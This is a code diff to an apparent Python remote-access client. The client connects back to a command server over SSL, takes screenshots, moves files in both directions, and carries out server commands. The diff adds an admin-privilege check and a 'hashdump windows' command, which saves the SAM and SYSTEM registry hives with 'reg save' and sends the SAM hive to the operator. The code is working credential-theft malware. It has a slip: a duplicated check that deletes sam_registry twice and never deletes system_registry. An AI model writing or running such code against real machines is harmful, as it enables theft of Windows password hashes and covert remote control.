@@ -2,11 +2,8 @@ import socket
 import ssl
 import subprocess
 import os
+import ctypes
 from PIL import ImageGrab
-
-
-# import pyautogui
-
 
 def format_filename(commande):
     # remove only the first word
@@ -19,6 +16,12 @@ def format_filename(commande):
     else:
         return file_path, file_path
 
+def is_admin():
+    try:
+        # Utiliser l'API Windows pour vérifier si le processus actuel est exécuté avec des privilèges administratifs
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
 def upload_feature(filename, conn):
     print(f"Downloading {filename}...")
@@ -105,7 +108,7 @@ def connect_to_server():
 
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     conn = context.wrap_socket(conn, server_hostname='localhost')  # Envelopper le socket avec SSL
-    conn.connect(('localhost', 1234))
+    conn.connect(('localhost', 12345))
 
     # get on which OS the client is running
     conn.send(os.name.encode('utf-8'))
@@ -115,6 +118,30 @@ def connect_to_server():
 
         if command.lower() == "close":
             break
+
+        elif command.lower() == "hashdump windows":
+            print("Hashdump Windows")
+            # check if the client is running on elevated privileges
+            if not is_admin():
+                conn.send("The client is not running with elevated privileges".encode('utf-8'))
+                continue
+            else:
+                conn.send("OK".encode('utf-8'))
+                # delete the files if they exist
+                if os.path.exists("sam_registry"):
+                    os.remove("sam_registry")
+                    print("sam_registry deleted")
+                if os.path.exists("sam_registry"):
+                    os.remove("sam_registry")
+                    print("sam_registry deleted")
+
+                # save the registry hives
+                subprocess.getoutput("reg save hklm\\sam sam_registry")
+                subprocess.getoutput("reg save hklm\\system system_registry")
+
+                # send the files
+                download_feature("sam_registry", conn)
+                #download_feature("system_registry", conn)
 
         # UPLOAD FILE command
         elif command.lower().startswith("upload"):
